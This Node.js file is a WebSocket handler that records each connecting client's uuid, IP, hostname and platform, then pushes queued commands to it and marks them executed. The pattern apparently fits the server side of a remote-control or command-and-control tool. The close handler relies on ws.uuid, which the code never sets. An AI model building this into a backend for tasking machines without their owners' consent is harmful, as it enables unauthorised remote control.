
const mongoose = require('mongoose');
const Client = require('../models/Client');
const Task = require('../models/Task');

module.exports = function connectionHandler(ws) {
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            if (!data.uuid) return;

            await Client.findOneAndUpdate(
                { uuid: data.uuid },
                {
                    $set: {
                        ip: data.ip,
                        hostname: data.hostname,
                        platform: data.platform,
                        lastSeen: new Date(),
                        status: 'online'
                    }
                },
                { upsert: true }
            );

            const tasks = await Task.find({ uuid: data.uuid, status: 'pending' });
            for (const task of tasks) {
                ws.send(JSON.stringify({ cmd: task.command }));
                task.status = 'executed';
                await task.save();
            }

        } catch (err) {
            console.error('WebSocket error:', err);
        }
    });

    ws.on('close', async () => {
        if (ws.uuid) {
            await Client.updateOne({ uuid: ws.uuid }, { status: 'offline' });
        }
    });
};
